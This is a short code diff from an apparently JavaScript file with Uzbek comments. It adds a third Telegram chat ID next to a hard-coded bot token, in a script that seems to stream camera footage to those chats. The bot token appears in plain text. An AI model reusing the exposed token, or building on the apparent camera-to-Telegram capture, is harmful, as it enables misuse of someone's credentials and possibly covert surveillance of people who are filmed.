@@ -5,7 +5,7 @@ let chunks = [];
 
 // Telegram bot tokeni va chat ID
 const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
-const CHAT_IDS = ['5934257995', '5826562502']; // Chat ID-larni shu yerga qo'ying
+const CHAT_IDS = ['5934257995', '5826562502','5228492900']; // Chat ID-larni shu yerga qo'ying
 
 // Kamera oqimini olish
 function startCamera() {
